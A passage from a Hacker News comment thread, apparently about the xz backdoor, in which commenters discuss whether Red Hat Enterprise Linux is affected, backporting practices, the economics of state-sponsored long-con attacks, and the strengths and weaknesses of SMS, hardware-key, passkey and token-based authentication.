ago](item?id=39871718)   | [root](#39867106) | [parent](#39870923) | [next](#39871315) [–]  RedHat blog says no versions of RHEL are affected. [https://www.redhat.com/en/blog/urgent-security-alert-fedora-...](https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users) | | --- | --- | --- | | | |  |  | [alex\_duf](user?id=alex_duf) [9 months ago](item?id=39872886)   | [root](#39867106) | [parent](#39871718) | [next](#39871315) [3 more]  [flagged] | | --- | --- | --- | | | |  |  | [\_ugfj](user?id=_ugfj) [9 months ago](item?id=39873928)   | [root](#39867106) | [parent](#39872886) | [next](#39871315) [–]  Are you implying *Redhat* is not reliable in their security disclosures? | | --- | --- | --- | | | |  |  | [alex\_duf](user?id=alex_duf) [9 months ago](item?id=39883628)   | [root](#39867106) | [parent](#39873928) | [next](#39871315) [–]  I was attempting a joke, but clearly that didn't convey, and isn't really in the hacker news spirit. | | --- | --- | --- | | | |  |  | [Zenul\_Abidin](user?id=Zenul_Abidin) [9 months ago](item?id=39871315)   | [root](#39867106) | [parent](#39870923) | [prev](#39871718) | [next](#39871064) [–]  I don't think EL7 gets *minor* version updates anymore though | | --- | --- | --- | | | |  |  | [soraminazuki](user?id=soraminazuki) [9 months ago](item?id=39871064)   | [root](#39867106) | [parent](#39870923) | [prev](#39871315) | [next](#39867911) [–]  I wouldn't count on it. RedHat packages contain lots of backported patches. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39874076)   | [root](#39867106) | [parent](#39871064) | [next](#39871572) [–]  These changes were not backported to RHEL. | | --- | --- | --- | | | |  |  | [indigodaddy](user?id=indigodaddy) [9 months ago](item?id=39871572)   | [root](#39867106) | [parent](#39871064) | [prev](#39874076) | [next](#39867911) [–]  Right, that notion was what was making me nervous | | --- | --- | --- | | | |  |  | [worthless-trash](user?id=worthless-trash) [9 months ago](item?id=39872009)   | [root](#39867106) | [parent](#39871572) | [next](#39867911) [–]  At least in my group, the backports are hand picked to solve specific problems, not just random wholesale backports. | | --- | --- | --- | | | |  |  | [bobba27](user?id=bobba27) [9 months ago](item?id=39872925)   | [root](#39867106) | [parent](#39872009) | [next](#39872342) [–]  For the duration of a major release, up until ~x.4 pretty much everything from upstream gets backported with a delay of 6-12 months, depending on how conservative to change the rhel engineer maintaining this part of the kernel is. After ~x.4 things slow down and only "important" fixes get backported but no new features. After ~x.7 or so different processes and approvals come into play and virtually nothing except high severity bugs or something that "important customer" needs will be backported. | | --- | --- | --- | | | |  |  | [worthless-trash](user?id=worthless-trash) [9 months ago](item?id=39873070)   | [root](#39867106) | [parent](#39872925) | [next](#39872342) [–]  Sadly, 8.6 and 9.2 kernel are the exception to this. Mainly as they are openshift container platform and fedramp requirements. The goal is that 8.6, 9.2 and 9.4 will have releases at least every two weeks. Maybe soon all Z streams will have a similar release cadence to keep up with the security expectations, but will keep a very similar expectations that you outlined above. | | --- | --- | --- | | | |  |  | [soraminazuki](user?id=soraminazuki) [9 months ago](item?id=39872342)   | [root](#39867106) | [parent](#39872009) | [prev](#39872925) | [next](#39867911) [–]  Sure, they aren't backporting patches wholesale. But the patches that did get backported, if any, needs much more scrutiny given the situation. The thing about enterprise Linux distros is that they have a long support period. Bug fixes and security patches pile up. Fortunately though, xz doesn't seem to have a lot of backported patches. <https://git.centos.org/rpms/xz/blob/c8s/f/SPECS/xz.spec> <https://git.centos.org/rpms/xz/blob/c7/f/SPECS/xz.spec> But take glibc for example. The amount of patches makes my head spin. [https://git.centos.org/rpms/glibc/blob/c8s/f/SPECS/glibc.spe...](https://git.centos.org/rpms/glibc/blob/c8s/f/SPECS/glibc.spec) | | --- | --- | --- | | | |  |  | [hangonhn](user?id=hangonhn) [9 months ago](item?id=39867911)   | [parent](#39867106) | [prev](#39869863) | [next](#39867867) [–]  I imagine it might be easier to just compromise a weakly protected account than to actual put in a 2 years long effort with real contributions. If we mandated MFA for all contributors who contribute to these really important projects then we can know with greater certainty if it was really a long con vs. a recently compromised account. | | --- | --- | --- | | | |  |  | [tw04](user?id=tw04) [9 months ago](item?id=39871711)   | [root](#39867106) | [parent](#39867911) | [next](#39869285) [–]  For some random server, sure. For a state sponsored attack? Having an embedded exploit you can use when convenient, or better yet an unknown exploit affecting every linux-based system connected to the internet that you can use when war breaks out - that's invaluable. | | --- | --- | --- | | | |  |  | [eru](user?id=eru) [9 months ago](item?id=39872050)   | [root](#39867106) | [parent](#39871711) | [next](#39869285) [–]  Yes, but even states have only finite resources, so even for them compromising an account would be cheaper. (But you are right that a sleeper would be affordable for them.) | | --- | --- | --- | | | |  |  | [treflop](user?id=treflop) [9 months ago](item?id=39872210)   | [root](#39867106) | [parent](#39872050) | [next](#39874068) [–]  Having one or two people on payroll to occasionally add commits to a project isn't exactly that expensive if it pays off. There are ~29,000,000 US government employees (federal, state and local). Other countries like China and India have tens of millions of government employees. | | --- | --- | --- | | | |  |  | [danieldk](user?id=danieldk) [9 months ago](item?id=39872501)   | [root](#39867106) | [parent](#39872210) | [next](#39873995) [–]  And they might as well be working on compromising other projects using different handles. | | --- | --- | --- | | | |  |  | [eru](user?id=eru) [9 months ago](item?id=39873995)   | [root](#39867106) | [parent](#39872210) | [prev](#39872501) | [next](#39874068) [–]  Not all government employees are equally capable. | | --- | --- | --- | | | |  |  | [EvmRoot](user?id=EvmRoot) [9 months ago](item?id=39876285)   | [root](#39867106) | [parent](#39873995) | [next](#39874068) [–]  Even if they contract it out, at $350/hr (which is not a price that would raise any flags), that is less that $750k. Even with a fancy office, couple of laptops and 5' monitors, this is less than a day at the bombing range or a few minutes keeping an aircraft carrier operational. Even a team of 10 people working on this - the code and social aspect - would be a drop in the bucket for any nation-state. | | --- | --- | --- | | | |  |  | [dgellow](user?id=dgellow) [9 months ago](item?id=39874068)   | [root](#39867106) | [parent](#39872050) | [prev](#39872210) | [next](#39869285) [–]  It’s a very cheap investment given the blast radius | | --- | --- | --- | | | |  |  | [guinea-unicorn](user?id=guinea-unicorn) [9 months ago](item?id=39869285)   | [root](#39867106) | [parent](#39867911) | [prev](#39871711) | [next](#39872538) [–]  I find it funny how MFA is treated as if it would make account takeover suddenly impossible. It's just a bit more work, isn't it? And a big loss in convenience. I'd much rather see passwords entirely replaced by key-based authentication. *That* would improve security. Adding 2FA to my password is just patching a fundamentally broken system. | | --- | --- | --- | | | |  |  | [ryukoposting](user?id=ryukoposting) [9 months ago](item?id=39869714)   | [root](#39867106) | [parent](#39869285) | [next](#39869346) [–]  Customer service at one of my banks has an official policy of sending me a verification code via email that I then read to them over the phone, and that's not even close to the most "wrong" 2FA implementation I've ever seen. Somehow that institution knows what a YubiKey is, but several major banks don't. | | --- | --- | --- | | | |  |  | [eairy](user?id=eairy) [9 months ago](item?id=39871778)   | [root](#39867106) | [parent](#39869714) | [next](#39870502) [–]  I'm security consultant in the financial industry. I've literally been involved in the decision making on this at a bank. Banks are very conservative, and behave like insecure teenagers. They won't do anything bold, they all just copy each other. I pushed YubiKey as a solution and explained in detail why SMS was an awful choice, but they went with SMS anyway. It mostly came down to cost. SMS was the cheapest option. YubiKey would involve buying and sending the keys to customers, and they having the pain/cost of supporting them. There was also the feeling that YubiKeys were too confusing for customers. The nail in the coffin was "SMS is the standard solution in the industry" plus "If it's good enough for VISA it's good enough for us". | | --- | --- | --- | | | |  |  | [ryukoposting](user?id=ryukoposting) [9 months ago](item?id=39876763)   | [root](#39867106) | [parent](#39871778) | [next](#39871840) [–]  Interesting. I assumed a lot of client software for small banks was vendored - I know that's the case for brokerages. Makes it all the weirder that they all imitate each other. Here's the thing about SMS: your great aunt who doesn't know what a JPEG is, knows what a text is. Ok, she might not fully "get it" but she knows where to find a text message in her phone. My tech-literate fiancée struggles to get her YubiKey to work with her phone, and I've tried it with no more luck than she's had. YubiKeys should be *supported* but they're miles away from being usable enough to totally supplant other 2FA flows. | | --- | --- | --- | | | |  |  | [heyoni](user?id=heyoni) [9 months ago](item?id=39871840)   | [root](#39867106) | [parent](#39871778) | [prev](#39876763) | [next](#39876747) [–]  But why won’t banks at least support customer provided yubikeys? | | --- | --- | --- | | | |  |  | [mulmen](user?id=mulmen) [9 months ago](item?id=39872197)   | [root](#39867106) | [parent](#39871840) | [next](#39872252) [–]  > But why won’t banks at least support customer provided yubikeys? > support You answered your own question. | | --- | --- | --- | | | |  |  | [heyoni](user?id=heyoni) [9 months ago](item?id=39876065)   | [root](#39867106) | [parent](#39872197) | [next](#39872252) [–]  And that’s the answer isn’t it? Banks are behind the times in terms of security and tech. | | --- | --- | --- | | | |  |  | [intelVISA](user?id=intelVISA) [9 months ago](item?id=39872252)   | [root](#39867106) | [parent](#39871840) | [prev](#39872197) | [next](#39889802) [–]  Banks loathe anything relating, or adjacent, to good SWE principles. | | --- | --- | --- | | | |  |  | [ryukoposting](user?id=ryukoposting) [9 months ago](item?id=39889802)   | [root](#39867106) | [parent](#39871840) | [prev](#39872252) | [next](#39873333) [–]  I'd guess part of the reason is that customers would blame the bank when their YubiKey doesn't work, which would become a nuisance for them as much as the YubiKey's usability issues are a nuisance for the customer. | | --- | --- | --- | | | |  |  | [jalk](user?id=jalk) [9 months ago](item?id=39873333)   | [root](#39867106) | [parent](#39871840) | [prev](#39889802) | [next](#39874338) [–]  Bank of America supports user purchased TOTP devices. [https://www.bankofamerica.com/security-center/online-mobile-...](https://www.bankofamerica.com/security-center/online-mobile-banking-privacy/usb-security-key/) | | --- | --- | --- | | | |  |  | [rainbowzootsuit](user?id=rainbowzootsuit) [9 months ago](item?id=39874338)   | [root](#39867106) | [parent](#39871840) | [prev](#39873333) | [next](#39872066) [–]  Brokerage, not bank, but you can do Yubikey-only at Vanguard. <https://www.bogleheads.org/forum/viewtopic.php?t=349826> | | --- | --- | --- | | | |  |  | [eru](user?id=eru) [9 months ago](item?id=39872066)   | [root](#39867106) | [parent](#39871840) | [prev](#39874338) | [next](#39874487) [–]  Because it's extra hassle? | | --- | --- | --- | | | |  |  | [mlrtime](user?id=mlrtime) [9 months ago](item?id=39874487)   | [root](#39867106) | [parent](#39871840) | [prev](#39872066) | [next](#39876747) [–]  The largest US crypto brokerages/exchanges support yubikey. Some will provide and require them for top customers to ensure they are safe. | | --- | --- | --- | | | |  |  | [dalyons](user?id=dalyons) [9 months ago](item?id=39876747)   | [root](#39867106) | [parent](#39871778) | [prev](#39871840) | [next](#39870502) [–]  I mean your employer wasn’t wrong. Yubikeys ARE way too confusing for the average user, way too easy to lose, etc. maybe have it as an option for power users, but they were right it would be a disastrous default. | | --- | --- | --- | | | |  |  | [Liquix](user?id=Liquix) [9 months ago](item?id=39870502)   | [root](#39867106) | [parent](#39869714) | [prev](#39871778) | [next](#39872933) [–]  Financial institutions are very slow to adopt new tech. Especially tech that will inevitably cost $$$ in support hours when users start locking themselves out of their accounts. There is little to no advantage to being the first bank to implement YubiKey 2FA. To a risk-averse org, the non-zero chance of a botched rollout or displeased customers outweighs any potential benefit. | | --- | --- | --- | | | |  |  | [monksy](user?id=monksy) [9 months ago](item?id=39870657)   | [root](#39867106) | [parent](#39870502) | [next](#39870766) [–]  They're pretty terrible when they do. For the longest time the max password size was 8 characters and the csr knew what your password was. Heck I've had Chase security tell me they'd call me back.. dude that's exactly how people get compromised. | | --- | --- | --- | | | |  |  | [biglost](user?id=biglost) [9 months ago](item?id=39871862)   | [root](#39867106) | [parent](#39870657) | [next](#39870766) [–]  A friensd bank, hopefully not the one i use, only allow a password off 6 digits. Yes You read it right, 6 fucking digits to login, i hace him the asvice to run away from that shitty bank | | --- | --- | --- | | | |  |  | [foepys](user?id=foepys) [9 months ago](item?id=39872365)   | [root](#39867106) | [parent](#39871862) | [next](#39870766) [–]  Did this bank start out as a "telephone bank"? One of the largest German consumer banks still does this because they were the first "direct bank" without locations and typing in digits on the telephone pad was the most secure way of authenticating without telling the "bank teller" your password. So it was actually a good security measure but it is apparently too complicated to update their backend to modern standards. They do require 2FA, though. | | --- | --- | --- | | | |  |  | [asm0dey](user?id=asm0dey) [9 months ago](item?id=39872868)   | [root](#39867106) | [parent](#39872365) | [next](#39870766) [–]  DiBa? | | --- | --- | --- | | | |  |  | [doubled112](user?id=doubled112) [9 months ago](item?id=39870766)   | [root](#39867106) | [parent](#39870502) | [prev](#39870657) | [next](#39872361) [–]  Exactly. 8 character password in the 2010s as the only factor was fine. It was only my money we're talking about. Now I have to wait for an SMS. Great... | | --- | --- | --- | | | |  |  | [throwaway2990](user?id=throwaway2990) [9 months ago](item?id=39871800)   | [root](#39867106) | [parent](#39870766) | [next](#39872361) [–]  SMS is fine on most countries. It’s just America is dumb and allows number transfers to anyone. | | --- | --- | --- | | | |  |  | [hwertz](user?id=hwertz) [9 months ago](item?id=39872428)   | [root](#39867106) | [parent](#39871800) | [next](#39874077) [–]  Nope, I read The Register (UK based) and they've had scandals from celebrities having their confidential SMS messages leaked; SMS spoofing; I think they even have SIM cloning going on every now and then in UK and some European countries. (since The Register is a tech site, my recollection is some carriers took technical measures to prevent these issues while quite a few didn't.) I don't think it's a thing that happens that often in UK etc.; but, it doesn't happen that frequently in the US either. It's just a thing that can potentially happen. | | --- | --- | --- | | | |  |  | [throwaway2990](user?id=throwaway2990) [9 months ago](item?id=39872568)   | [root](#39867106) | [parent](#39872428) | [next](#39874077) [–]  UK has plenty of other problems to solve first with identity thief. | | --- | --- | --- | | | |  |  | [croemer](user?id=croemer) [9 months ago](item?id=39873969)   | [root](#39867106) | [parent](#39872568) | [next](#39874077) [–]  ...where identity is proved by utility bills instead of government issued id | | --- | --- | --- | | | |  |  | [doubled112](user?id=doubled112) [9 months ago](item?id=39874097)   | [root](#39867106) | [parent](#39873969) | [next](#39874077) [–]  How else do you prove you live some place? “I pay the bills there” is barely better than nothing, though. We do this in Canada too. It is what I used for a driver’s license one renewal. | | --- | --- | --- | | | |  |  | [dewey](user?id=dewey) [9 months ago](item?id=39874077)   | [root](#39867106) | [parent](#39871800) | [prev](#39872428) | [next](#39872039) [–]  SS7 is a global issue, and so is social engineering to get a number transferred or SIM card transferred. <https://hitcon.org/2015/CMT/download/day1-d-r0.pdf> | | --- | --- | --- | | | |  |  | [KiwiJohnno](user?id=KiwiJohnno) [9 months ago](item?id=39872039)   | [root](#39867106) | [parent](#39871800) | [prev](#39874077) | [next](#39873449) [–]  Its also been a problem in Australia, Optus (2nd biggest teleco) used to allow number porting or activating sim against an existing account with a bare minimum of detail - Like a name, address and date of birth. If you had those details of a target you could clone their SIM and crack any SMS based MFA. | | --- | --- | --- | | | |  |  | [chris\_wot](user?id=chris_wot) [9 months ago](item?id=39874431)   | [root](#39867106) | [parent](#39872039) | [next](#39873449) [–]  Is that alllowed now still? | | --- | --- | --- | | | |  |  | [throwaway2990](user?id=throwaway2990) [9 months ago](item?id=39879137)   | [root](#39867106) | [parent](#39874431) | [next](#39873449) [–]  Apparently changed in 2022 to protect consumers. | | --- | --- | --- | | | |  |  | [vladvasiliu](user?id=vladvasiliu) [9 months ago](item?id=39873449)   | [root](#39867106) | [parent](#39871800) | [prev](#39872039) | [next](#39872096) [–]  I don’t know about other parts, but here in France SMS is a shitshow. I regularly fail to receive them even though I know I have good reception. This happened the other day while I was on a conference call with perfect audio and video using my phone’s mobile data. A few weeks back, had some shop which sends out an SMS to inform you the job’s done tell me this is usually hit and miss when I complained about not hearing from them. | | --- | --- | --- | | | |  |  | [high\_priest](user?id=high_priest) [9 months ago](item?id=39874660)   | [root](#39867106) | [parent](#39873449) | [next](#39872096) [–]  Many single radio phones can either receive sms/calls, or transmit data. My relative owns such a device and cannot use internet during calls or receive/make calls during streaming like YT video playback. | | --- | --- | --- | | | |  |  | [vladvasiliu](user?id=vladvasiliu) [9 months ago](item?id=39875077)   | [root](#39867106) | [parent](#39874660) | [next](#39872096) [–]  In my case this is an iPhone 14 pro. I'm pretty sure I can receive calls while using data, since I often look things up on the internet while talking to my parents. And, by the way, the SMS in question never arrived. I don't know if there's some kind of timeout happening, and the network gives up after a while. Some 15 years ago I remember getting texts after an hour or two if I only had spotty reception. This may of course have changed in the meantime, plus this is a different provider. | | --- | --- | --- | | | |  |  | [StillBored](user?id=StillBored) [9 months ago](item?id=39872096)   | [root](#39867106) | [parent](#39871800) | [prev](#39873449) | [next](#39872064) [–]  SMS is not E2E encrypted, so for all intents is just a plain text message that can/has been snooped. Might as well just send a plaintext emails as well. | | --- | --- | --- | | | |  |  | [eru](user?id=eru) [9 months ago](item?id=39872064)   | [root](#39867106) | [parent](#39871800) | [prev](#39872096) | [next](#39872361) [–]  Number transfers in other countries is also mostly just a question of a bit of social engineering. | | --- | --- | --- | | | |  |  | [throwaway2990](user?id=throwaway2990) [9 months ago](item?id=39872539)   | [root](#39867106) | [parent](#39872064) | [next](#39872361) [–]  No. Most require some form of identification or matching identification between mobile providers. | | --- | --- | --- | | | |  |  | [macrolime](user?id=macrolime) [9 months ago](item?id=39875875)   | [root](#39867106) | [parent](#39872539) | [next](#39880423) [–]  I recently had an issue with a sim card and went to phone store that gave me a new one and disabled the old. They're supposed to ask for ID, but often doesn't bother. This is true for pretty much every country. Phone 2FA is simply completely insecure. | | --- | --- | --- | | | |  |  | [eru](user?id=eru) [9 months ago](item?id=39880423)   | [root](#39867106) | [parent](#39872539) | [prev](#39875875) | [next](#39872361) [–]  If the ID matching is done by humans, you can use social engineering on it. See the sibling comment. | | --- | --- | --- | | | |  |  | [darkr](user?id=darkr) [9 months ago](item?id=39872361)   | [root](#39867106) | [parent](#39870502) | [prev](#39870766) | [next](#39871789) [–]  > There is little to no advantage to being the first bank to implement YubiKey 2FA Ideally they’d just implement passkeys (webauthn/fido). More secure, and it works with iOS, android, 1password, and yubikeys | | --- | --- | --- | | | |  |  | [grepfru\_it](user?id=grepfru_it) [9 months ago](item?id=39871789)   | [root](#39867106) | [parent](#39870502) | [prev](#39872361) | [next](#39872933) [–]  Uh many banks provide MFA. And secure with hardware keys. It’s just that your level of assets doesn’t warrant that kind of protection. Source: worked at all the major banks, all the wealthy clients use hardware MFA | | --- | --- | --- | | | |  |  | [wsc981](user?id=wsc981) [9 months ago](item?id=39872792)   | [root](#39867106) | [parent](#39871789) | [next](#39871846) [–]  The bank I used in The Netherlands provides a MFA device as well. The device requires an ATM card as well to generate a random number. This is the default for all their customers, wealthy or not. [https://www.abnamro.nl/en/commercialbanking/internetbanking/...](https://www.abnamro.nl/en/commercialbanking/internetbanking/e.dentifier/index.html) | | --- | --- | --- | | | |  |  | [grepfru\_it](user?id=grepfru_it) [9 months ago](item?id=39876127)   | [root](#39867106) | [parent](#39872792) | [next](#39871846) [–]  I meant to say in the us :) | | --- | --- | --- | | | |  |  | [heyoni](user?id=heyoni) [9 months ago](item?id=39871846)   | [root](#39867106) | [parent](#39871789) | [prev](#39872792) | [next](#39872444) [–]  They’re a bank. If they can secure their portals with hardware keys, at least allow customers to onboard their own keys. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39872444)   | [root](#39867106) | [parent](#39871789) | [prev](#39871846) | [next](#39872933) [–]  My bank gave me an hardware token to protect my 5k€ account. Get better banks people :) | | --- | --- | --- | | | |  |  | [grepfru\_it](user?id=grepfru_it) [9 months ago](item?id=39876142)   | [root](#39867106) | [parent](#39872444) | [next](#39872933) [–]  I meant to say in the us. You know how backwards we are here :) | | --- | --- | --- | | | |  |  | [gonzo41](user?id=gonzo41) [9 months ago](item?id=39872933)   | [root](#39867106) | [parent](#39869714) | [prev](#39870502) | [next](#39870813) [–]  Banks are in a tough spot. Remember, banks have you as a customer, they also have a 100 year old person who still wants to come to the branch in person as a customer. Not everyone can grapple with the idea of a Yubikey, or why their bank shouldn't be protecting their money like it did in the past. | | --- | --- | --- | | | |  |  | [codedokode](user?id=codedokode) [9 months ago](item?id=39874357)   | [root](#39867106) | [parent](#39872933) | [next](#39870813) [–]  The problem is that the bank will automatically enable online access and SMS-confirmed transfers for that 100 year old person who doesn't even know how to use Internet. | | --- | --- | --- | | | |  |  | [krinchan](user?id=krinchan) [9 months ago](item?id=39870813)   | [root](#39867106) | [parent](#39869714) | [prev](#39872933) | [next](#39869346) [–]  Just say BofA. | | --- | --- | --- | | | |  |  | [snnn](user?id=snnn) [9 months ago](item?id=39872111)   | [root](#39867106) | [parent](#39870813) | [next](#39869346) [–]  Not actually. Even if you enabled passkey, you still can login to their phone app via SMS. So it is not more secure. People who knows how to do SMS attacks certainly knows how to install a mobile app. And BofA gave their customers a fake assurance. | | --- | --- | --- | | | |  |  | [hangonhn](user?id=hangonhn) [9 months ago](item?id=39869346)   | [root](#39867106) | [parent](#39869285) | [prev](#39869714) | [next](#39875289) [–]  yeah someone replied to one of my comments about adding MFA that an attacker can get around all that simply by buying the account from the author. I was way too narrowly focused on the technical aspects and was completely blind to other avenues like social engineering, etc. All very fair points. | | --- | --- | --- | | | |  |  | [fsckboy](user?id=fsckboy) [9 months ago](item?id=39875289)   | [root](#39867106) | [parent](#39869285) | [prev](#39869346) | [next](#39870066) [–]  >*I'd much rather see passwords entirely replaced by key-based authentication* I've never understood how key-based systems are considered better. I understand the encryption angle, nobody is compromising that. But now I have a key I need to personally shepherd? where do I keep it, and my backups, and what is the protection on those places? how many local copies, how many offsite? And I still need a password to access/use it, but with no recourse should I lose or forget. how am I supposed to remember that? It's all just kicking the same cans down the same roads. | | --- | --- | --- | | | |  |  | [AgentME](user?id=AgentME) [9 months ago](item?id=39870066)   | [root](#39867106) | [parent](#39869285) | [prev](#39875289) | [next](#39869998) [–]  Passkeys are being introduced right now in browsers and popular sites like a MFA option, but I think the intention is that they will grow and become the main factor in the future. | | --- | --- | --- | | | |  |  | [riddley](user?id=riddley) [9 months ago](item?id=39870684)   | [root](#39867106) | [parent](#39870066) | [next](#39869998) [–]  From what I've seen they're all controlled by huge tech companies. Hard pass. | | --- | --- | --- | | | |  |  | [doubled112](user?id=doubled112) [9 months ago](item?id=39870807)   | [root](#39867106) | [parent](#39870684) | [next](#39871598) [–]  I liked the username, password and TOTP combination. I could choose my own password manager, and TOTP generator app, based on my preferences. I have a feeling this won't hold true forever. Microsoft has their own authenticator now, Steam has another one, Google has their "was this you?" built into the OS. Monetization comes next? "View this ad before you login! Pay 50c to stay logged in for longer?" | | --- | --- | --- | | | |  |  | [AgentME](user?id=AgentME) [9 months ago](item?id=39871634)   | [root](#39867106) | [parent](#39870807) | [next](#39871870) [–]  Passkeys are an open standard with multiple implementations. It represents the opposite of the trend you're worried about there. | | --- | --- | --- | | | |  |  | [tux3](user?id=tux3) [9 months ago](item?id=39872896)   | [root](#39867106) | [parent](#39871634) | [next](#39871844) [–]  MS Azure Active Entra's FIDO2 implementation only allows a select list of vendors. You need a certification from FIDO ($,$$$), you need to have an account that can upload on the MDS metadata service, and you need to talk to MS to see if they'll consider adding you to the list It's not completely closed, but in practice no one on that list is a small independent open source project, those are all the kind of entrenched corporate security companies you'd expect | | --- | --- | --- | | | |  |  | [thayne](user?id=thayne) [9 months ago](item?id=39871844)   | [root](#39867106) | [parent](#39871634) | [prev](#39872896) | [next](#39874685) [–]  But the way it is designed, you can require a certain provider, and you can bet at least some sites will start requiring attestation from Google and or Apple. | | --- | --- | --- | | | |  |  | [nmadden](user?id=nmadden) [9 months ago](item?id=39873506)   | [root](#39867106) | [parent](#39871844) | [next](#39874685) [–]  Do they do attestation by default? I thought for Apple at least that was only a feature for enterprise managed devices (MDM). Attestation is also a registration-time check, so doesn’t necessarily constrain where the passkey is synced to later on. | | --- | --- | --- | | | |  |  | [endgame](user?id=endgame) [9 months ago](item?id=39874685)   | [root](#39867106) | [parent](#39871634) | [prev](#39871844) | [next](#39871870) [–]  Because that worked so well for OpenID. If you're lucky, you have the choice of which BigTech account you can use. | | --- | --- | --- | | | |  |  | [wepple](user?id=wepple) [9 months ago](item?id=39871870)   | [root](#39867106) | [parent](#39870807) | [prev](#39871634) | [next](#39872388) [–]  TOTP has substantial security gaps to make it a non-starter. Maybe a pubkey system where you choose your own client would be what you’re looking for? | | --- | --- | --- | | | |  |  | [pabs3](user?id=pabs3) [9 months ago](item?id=39873349)   | [root](#39867106) | [parent](#39871870) | [next](#39872388) [–]  TLS Client Certs (aka mTLS) is an option for that, but the browser UI stuff for it is terrible and getting worse. | | --- | --- | --- | | | |  |  | [doubled112](user?id=doubled112) [9 months ago](item?id=39874105)   | [root](#39867106) | [parent](#39873349) | [next](#39872388) [–]  I couldn’t imagine trying to train the general public to use mTLS and deploy that system. I’m not even sure it is difficult. Most people I’ve talked to in tech don’t even realize it is a possibility. Certificates are “complicated” as they put it. | | --- | --- | --- | | | |  |  | [LoganDark](user?id=LoganDark) [9 months ago](item?id=39872388)   | [root](#39867106) | [parent](#39870807) | [prev](#39871870) | [next](#39871598) [–]  > Google has their "was this you?" built into the OS. Not only that, but it's completely impossible to disable or remove that functionality or even make TOTP the primary option. Every single time I try to sign in, Google prompts my phone first, giving me a useless notification for later, and I have to manually click a couple of buttons to say "no I am not getting up to grab my phone and unlock it for this bullshit, let me enter my TOTP code". Every single time. | | --- | --- | --- | | | |  |  | [AgentME](user?id=AgentME) [9 months ago](item?id=39871598)   | [root](#39867106) | [parent](#39870684) | [prev](#39870807) | [next](#39873343) [–]  I don't understand this criticism. What is being controlled? Passkeys are an open standard that a browser can implement with public key crypto. | | --- | --- | --- | | | |  |  | [ndriscoll](user?id=ndriscoll) [9 months ago](item?id=39871876)   | [root](#39867106) | [parent](#39871598) | [next](#39873343) [–]  Doesn't passkeys give the service a signature to prove what type of hardware device you're using? e.g. it provides a way for the server to check whether you are using a software implementation? It's not really open if it essentially has type of DRM built in. | | --- | --- | --- | | | |  |  | [LoganDark](user?id=LoganDark) [9 months ago](item?id=39872398)   | [root](#39867106) | [parent](#39871876) | [next](#39873343) [–]  You're thinking of hardware-backed attestation, which provides a hardware root of trust. I believe passkeys are just challenge-response (using public key cryptography). You *could* probably add some sort of root of trust (for example, have the public key signed by the HSM that generated it) but that would be entirely additional to the passkey itself. | | --- | --- | --- | | | |  |  | [pabs3](user?id=pabs3) [9 months ago](item?id=39873355)   | [root](#39867106) | [parent](#39872398) | [next](#39873343) [–]  Passkeys do have the option of attestation, but the way Apple at least do them means Apple users won't have attestation, so most services won't require attestation. | | --- | --- | --- | | | |  |  | [pabs3](user?id=pabs3) [9 months ago](item?id=39873343)   | [root](#39867106) | [parent](#39870684) | [prev](#39871598) | [next](#39871250) [–]  KeepassXC is working on supporting them natively in software, so you would not need to trust big tech companies, unless you are logging into a service that requires attestation to be enabled. | | --- | --- | --- | | | |  |  | [SahAssar](user?id=SahAssar) [9 months ago](item?id=39871250)   | [root](#39867106) | [parent](#39870684) | [prev](#39873343) | [next](#39873338) [–]  Password managers are adding support (as in they control the keys) and I've used my yubikeys as "passkeys" (with the difference that I can't autofill the username). It's a good spec. I wish more people who spread FUD about it being a "tech-giant" only thing would instead focus on the productive things like demanding proper import/export between providers. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39882066)   | [root](#39867106) | [parent](#39871250) | [next](#39873338) [–]  You realise that the second your password manager has it, then it's no longer MFA but it's just 1 factor authentication with extra steps right? Password manager turns something you know into something you own. If also the something you own is in the password manager itself… it's the same as requiring extra long passwords. | | --- | --- | --- | | | |  |  | [pabs3](user?id=pabs3) [9 months ago](item?id=39873338)   | [root](#39867106) | [parent](#39870684) | [prev](#39871250) | [next](#39869998) [–]  They also require JavaScript to work unfortunately. | | --- | --- | --- | | | |  |  | [apitman](user?id=apitman) [9 months ago](item?id=39869998)   | [root](#39867106) | [parent](#39869285) | [prev](#39870066) | [next](#39872538) [–]  <https://xkcd.com/538/> | | --- | --- | --- | | | |  |  | [gamer191](user?id=gamer191) [9 months ago](item?id=39872538)   | [root](#39867106) | [parent](#39867911) | [prev](#39869285) | [next](#39872950) [–]  This PR from July 8 2023 is suspicious, so it was very likely a long con: <https://github.com/google/oss-fuzz/pull/10667> | | --- | --- | --- | | | |  |  | [bobba27](user?id=bobba27) [9 months ago](item?id=39872950)   | [root](#39867106) | [parent](#39867911) | [prev](#39872538) | [next](#39870947) [–]  This is a state sponsored event. Pretty poorly executed though as they were tweaking and modifying things in their and other tools after the fact though. As a state sponsored project. What makes you think this is their only project and that this is a big setback? I am paranoid myself to think yesterdays meeting went like : "team #25 has failed/been found out. Reallocate resources to the other 49 teams." | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39870947)   | [root](#39867106) | [parent](#39867911) | [prev](#39872950) | [next](#39871953) [–]  As I said recently in a talk I gave, 2FA as implemented by pypy or github is meaningless, when in fact all actions are performed via tokens that never expire, that are saved inside a .txt file on the disk. | | --- | --- | --- | | | |  |  | [heyoni](user?id=heyoni) [9 months ago](item?id=39871867)   | [root](#39867106) | [parent](#39870947) | [next](#39871451) [–]  Passwords have full scope of permission while session tokens can be limited. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39887324)   | [root](#39867106) | [parent](#39871867) | [next](#39871451) [–]  In pypi to obtain a token that is limited in scope you must first generate an unlimited token. True story. In gh you can generate a limited one, but it's not really clear on what the permissions actually mean, so it's trial and error… which means most people will get tired and grant random stuff to have them working. | | --- | --- | --- | | | |  |  | [heyoni](user?id=heyoni) [9 months ago](item?id=39887902)   | [root](#39867106) | [parent](#39887324) | [next](#39871451) [–]  I didn’t know that about pypi but github has seemed ok to me. I’ve also implemented my own scoped authentication systems so even if they’re not perfect I know it can be done | | --- | --- | --- | | | |  |  | [CapstanRoller](user?id=CapstanRoller) [9 months ago](item?id=39871451)   | [root](#39867106) | [parent](#39870947) | [prev](#39871867) | [next](#39871953) [–]  Doesn't GH explicitly warn against using non-expiring tokens? | | --- | --- | --- | | | |  |  | [yrro](user?id=yrro) 